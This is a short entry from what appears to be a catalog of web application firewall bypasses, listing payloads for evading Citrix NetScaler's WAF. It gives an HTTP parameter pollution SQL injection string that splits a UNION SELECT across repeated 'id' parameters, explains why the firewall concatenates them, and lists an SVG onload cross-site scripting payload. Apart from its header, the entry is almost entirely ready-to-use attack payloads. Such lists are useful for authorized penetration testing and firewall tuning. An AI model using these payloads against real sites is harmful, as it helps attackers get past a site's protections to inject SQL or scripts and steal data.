---
id: WAF-BYPASS-010
title: Citrix NetScaler WAF Bypass Payloads
category: Known Bypasses
severity_range: Medium-Critical
---

# Citrix NetScaler WAF Bypass Payloads

## SQLi Bypasses (HPP)

1. HTTP Parameter Pollution: `?id=1&id=UNION&id=SELECT&id=1,2,3--`
   - NetScaler concatenates parameters by order, allowing injection splitting

## XSS Bypasses

1. `<svg onload=alert(1)>`
2. Obfuscated XSS through parameter splitting
